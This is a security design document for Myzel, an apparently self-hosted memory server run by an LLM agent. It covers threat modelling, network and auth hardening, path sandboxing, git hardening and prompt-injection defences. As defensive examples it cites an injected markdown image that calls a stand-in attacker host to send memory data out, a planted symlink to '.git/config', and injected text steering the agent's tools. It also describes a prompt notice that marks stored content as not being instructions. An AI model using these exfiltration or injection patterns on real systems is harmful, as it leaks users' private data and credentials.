# Security

How Myzel defends the memory, how to deploy it without undoing that and what is known to be
left open. The rules that code changes must keep are in [AGENTS.md](../AGENTS.md) §4 and §8;
this page explains the reasoning behind them.

## Threat model

The memory is personal data, and anyone who can reach `/mcp` or `/api` can read *and rewrite* it.
Untrusted input arrives in five ways:

| Source | Example |
|---|---|
| **Network clients** | A web page the user visits tries to call the local server (drive-by, DNS rebinding); anyone on the LAN connects directly. |
| **Bundle files** | A git-synced or bind-mounted bundle contains files, symlinks or a `.git` directory nobody reviewed. |
| **Text the agent ingests** | Prompt injection in saved content steers the internal agent's tools, including writes and deletes. |
| **Model output** | Agent answers are rendered as markdown in the web UI. |
| **Dependencies and build** | A compromised package, action or base image. |

## Defenses

### Network

- **Loopback by default.** The server binds `127.0.0.1`. The compose files publish the port on
  `127.0.0.1` (`MYZEL_BIND`). Network exposure is always an explicit step, and the server
  warns when it is exposed without `AUTH_TOKEN`.
- **Origin check** on `/mcp` and `/api`: browsers may call only from the same origin or from an
  origin listed in `ALLOWED_ORIGINS`. CORS mirrors the same allowlist and never reflects the
  request's origin.
- **Host check against DNS rebinding**, on every bind. Loopback names always pass, IP addresses
  pass on a public bind (an address cannot be rebound), and any other hostname must be listed in
  `ALLOWED_HOSTS`.
- **Bearer auth** (`AUTH_TOKEN`). Tokens are compared as SHA-256 digests with `timingSafeEqual`.
  Failed attempts are throttled *before* the comparison: 20 per 15 minutes per client. A failure
  is counted in the same synchronous step that detects it, so a burst of parallel guesses cannot
  slip past the limit, and valid requests — however long they run — never count.
- **Order matters** in `buildApp()` (`server/src/app.ts`): the network guard runs before auth, so a hostile
  origin is refused whether or not a token is set.
- **Response hardening:**
  - a CSP that allows scripts only from the same origin and no framing (`frame-ancestors 'none'`);
  - `nosniff` and `Referrer-Policy: no-referrer`;
  - no `x-powered-by` header;
  - a final error handler that never returns stack traces.

### Profiles (one server, several memories)

- **The API key is the only selector.** A key both authenticates the caller and decides which
  memory they reach; there is no request parameter that names a profile, so one profile's key
  cannot be pointed at another's data. Each profile is a separate bundle with its own caches,
  hot memory, traces and git history.
- Keys are 192 random bits (`myz_…`), shown once and stored only as SHA-256 hashes in
  `profiles.json` (mode `0600`); lookups compare against every record in constant time. Wrong keys
  hit the same kind of failure throttle as `AUTH_TOKEN` guesses (a request with no key at all is
  not counted, so page loads before a key is entered never lock anyone out).
- **The registry fails closed:** an unreadable or malformed `profiles.json` (including duplicate
  names or keys) authenticates nobody. Registry changes take a lock file across processes (server
  and CLI); the lock holds a random token, so a process only ever releases its own, and a stale
  lock is taken over by an atomic rename. A re-read that overlaps a change is discarded, so a
  revoked or rotated key cannot come back.
- **Removing a profile stops its memory.** Its `KnowledgeBase` is closed — requests still holding
  it can no longer write — and running writes finish before a purge deletes the data. A profile
  re-created under the same name gets a fresh instance with empty caches.
- **Profiles are managed with the CLI only.** There is no HTTP API for them; the CLI needs
  access to the server's files (in Docker, `docker exec`).
- **`/admin` uses a separate `ADMIN_TOKEN`**, which opens the settings page but no
  memory; neither `AUTH_TOKEN` nor a profile key can reach `/admin`. `/admin` sits behind the same
  network guard, and has a failure throttle of its own (same limits, separate budget).
  Without `ADMIN_TOKEN`, it does not exist.
- Profile names are restricted to `[a-z0-9][a-z0-9_-]{0,62}` — no dots or slashes — because a name
  is used as a directory.

### The settings page

`ADMIN_TOKEN` can change which model Myzel talks to. Whoever holds it can point
`LLM_API_BASE_URL` at a server of their own, and every agent run then sends that server the memory
content it reads. Treat the admin token like the model API key, or stronger.

- **Only model and behaviour settings** are editable. Network and access settings (`HOST`,
  `AUTH_TOKEN`, `ADMIN_TOKEN`, `ALLOWED_ORIGINS`, `ALLOWED_HOSTS`, `TRUST_PROXY`, the bundle paths) are not in the
  catalog, and `SETTINGS_FILE` entries for them are ignored at startup with a warning.
- **Secrets stay on the server.** API keys are write-only: the API reports whether one is set,
  never its value, and the log names changed settings without values.
- **A new endpoint needs its key.** Changing `LLM_API_BASE_URL` or `LLM_FALLBACK_API_BASE_URL` is
  refused unless the matching API key is set on the settings page too, so the key configured in the
  environment is never sent to an endpoint the admin picked.
- **Values are validated** before anything is written: URLs must be `http(s)`, durations and counts
  must parse, and no value may contain a line break or control character (they end up in
  environment variables and request headers). A batch whose model setup would not resolve is
  refused as a whole.
- **The file is private and written atomically:** mode `0600`, a random temp name created
  exclusively, then a rename. An unreadable or invalid file stops the server at startup instead of
  being skipped.
- The browser keeps the admin token in memory only, not in `sessionStorage` like the memory's
  token: a reload asks for it again.

### Bundle files

- **Path sandbox.** All paths go through `Bundle.resolve()`, which normalizes the path *before*
  checking that it is inside the bundle. Content reads, writes, deletes and index regeneration
  additionally follow symlinks (`assertRealPathInside`, `resolveContained`).
- **Walkers skip symlinks and dot-entries**, so host files never enter the tree, search, graph or
  index, and `.traces/` and `.git` stay invisible.
- **The concept API stays out of hidden paths.** Reads, writes and deletes refuse any path with a
  dot segment (`/.git/config`, `/.traces/…`) — as typed *and* after following symlinks — and
  reads require `.md`, so a prompt-injected agent cannot read repository credentials or other
  callers' traces through `read_concept`, not even via a planted `notes/x.md -> ../.git/config`.
- **Writes cannot be redirected.** Temp files get random names and are created with `O_EXCL`, so a
  symlink planted under a predictable temp name is never followed. Directories are created only
  after the target's nearest existing ancestor is confirmed to be inside the bundle. `log.md` is
  used only when it resolves to a file inside the bundle (a symlink is replaced, never written
  through, by the atomic rename), and `.traces/` only when it is a real directory; a symlinked
  `.traces` is ignored rather than written to or pruned.
- **Frontmatter is YAML only.** Fences naming another language (`---js`) are refused, because
  general-purpose frontmatter parsers evaluate them as code. Parsing uses the YAML 1.2 core
  schema, and aliases are capped by the `yaml` library.
- **The bundle's `.git` is untrusted** (`okf/git.ts`). Git can run programs during a plain `add`
  or `commit`, so every git call:
  - disables hooks, fsmonitor and commit signing;
  - is refused when the repository's own config sets any key that runs a command (filters, diff
    drivers, aliases, `include.path`, …) or points git elsewhere (`core.worktree`). Every
    repository-controlled scope is checked, including `.git/config.worktree`. The check fails
    closed;
  - stages and commits only the files the mutation touched (the concept, its `index.md` chain,
    `log.md`), never `.traces/` (users' prompts) and never the user's own edits.

### Prompt injection

- Titles, descriptions, types, paths and log lines are collapsed to one line and stripped of
  control and bidi characters before they reach any prompt (`agent/untrusted.ts`), so stored text
  cannot forge an instruction line. This covers the agent's system prompt, the session seed sent
  to MCP clients, hot memory and the maintenance and dreaming instructions.
- Every one of those prompts states that the listings are stored content, not instructions
  (`UNTRUSTED_CONTENT_NOTICE`).
- `log.md` is re-rendered from a strict grammar on every append, so a summary cannot decide where
  the next entry lands.
- **Limit:** concept *bodies* are free-form by design, and the agent reads them. A model can still
  be persuaded by text it reads on purpose. Review what lands in a memory that ingests untrusted
  sources.

### Model output in the web UI

- Markdown is sanitized with `rehype-sanitize` (links: `http`, `https`, `mailto` only).
- `dangerouslySetInnerHTML` is used only for Shiki's highlighted code, which escapes its input.
- External links get `noopener noreferrer`.
- **Images load only from the server itself** (CSP `img-src 'self' data:`). Model output is
  rendered as markdown, and an injected `![](https://attacker/?data=…)` would otherwise send memory
  contents away the moment it renders. The cost: external images in concepts don't display.
- The access token is kept in `sessionStorage`, so it lives only as long as the tab.

### Cost and availability

- **Rate limits:**
  - `/mcp` and `/api/chat`, which can start agent runs: `RATE_LIMIT`, default 60/min;
  - the read-only `/api` routes, which read the whole bundle: `RATE_LIMIT_BROWSE`, default 600/min.

  IPv6 clients are grouped by /64. Behind a reverse proxy, set `TRUST_PROXY`.
- **Input caps** (`server/src/limits.ts`):

  | Input | Limit |
  |---|---|
  | `memory_query` question | 4,000 characters |
  | `memory_add` content | 100,000 characters |
  | `memory_update` instruction | 20,000 characters |
  | newest chat turn | 20,000 characters |
  | text attached to the newest chat turn | 100,000 characters |
  | whole chat conversation (re-sent with every turn) | 200,000 characters |
  | concept body returned by `read_concept` | 20,000 characters |
  | JSON body | 1 MB |

  Chat requests may only carry `user` and `assistant` messages. Chat attachments must be text,
  sent inline as `data:` URLs; the server decodes them into the prompt, so a model provider is
  never handed a URL to fetch.

- Clients cannot choose a model unless it is listed in `ALLOWED_MODELS`.
- Agent runs have a step cap (`LLM_MAX_STEPS`) and a time limit (`LLM_TIMEOUT`), and stop when
  the chat or MCP client disconnects or cancels.
- Durations are capped at what a timer can hold (about 24.8 days); larger values would make
  timers fire at once — e.g. a dream on every millisecond.
- Dreaming runs only when its signals changed since the last dream: at least five new log
  entries, or orphans, broken links, duplicates or oversized concepts it hasn't acted on yet.
- Link extraction runs in linear time, even on hostile input.

### Secrets

- Provider errors reach clients only as an HTTP status (`publicErrorMessage`); the full error is
  logged on the server.
- URLs in logs and error messages are redacted (`redactUrl`), since some gateways take the key in
  the URL.
- `.dockerignore` keeps `.env` out of the image.

### Supply chain and image

- **Pinning:** GitHub Actions are pinned to commit SHAs and the base image to a digest. Dependabot
  keeps them, and npm packages, current with a 7-day cooldown.
- **Least privilege in CI:** the workflow starts from `permissions: {}` and each job asks only for
  what it needs.
- **Checks:** CI fails on high or critical advisories in production dependencies.
- **Published images** carry an SBOM and a signed build-provenance attestation.
- **The container:**
  - runs as the unprivileged `node` user;
  - uses `tini` as PID 1;
  - shuts down gracefully, waiting for pending writes;
  - has a `/healthz` health check.

## Deploying safely

1. **Keep the default bind** unless other machines need access. To expose it, set
   `MYZEL_BIND=0.0.0.0` (compose) or `HOST=0.0.0.0` (native), **and** set `AUTH_TOKEN` to a
   long random value (`openssl rand -hex 24`).
2. **Reaching it by name** (`nas.local`, a proxy domain)? Add that name to `ALLOWED_HOSTS`. Access
   by IP address needs nothing.
3. **Behind a reverse proxy**, set `TRUST_PROXY` (e.g. `1` for one hop), so rate limits apply per
   client.
4. **Several people or projects:** one memory is one circle of trust. Everyone who shares it can
   read and change all of it and see the others' questions (traces, query cache). For a wall
   between them, use profiles (`PROFILES_ROOT`) — one memory and key each.
   `HOT_MEMORY_RECALL_QA=false` only means less cross-talk between callers' answers.
5. **`GIT_AUTOCOMMIT` with a bind-mounted bundle** works across file owners. A repository whose
   config can run programs is refused, so remove such keys to enable commits.

## Known limitations

- **No OS-package scan of the image.** CI audits npm dependencies only. A scanner needs a
  third-party action, which is a supply-chain decision of its own.
- **Whole-bundle reads.** Search, graph and validate read every concept on each request. The
  session seed is cached and the browse API is rate-limited, but a shared, fingerprint-invalidated
  snapshot would remove the rest of that cost.
- **Two check-then-act windows.** Between the symlink check and the write of a concept, and
  between the git config check and `add`/`commit`, a process that rewrites the bundle at the same
  moment could swap in a symlink or config. Exploiting that needs control of a concurrent writer
  (e.g. a sync daemon) and precise timing; closing it fully would need file-descriptor-relative
  I/O that Node does not offer.
- **The mutation queue is per process.** An stdio client and the HTTP server pointed at the same
  bundle are not serialized against each other.
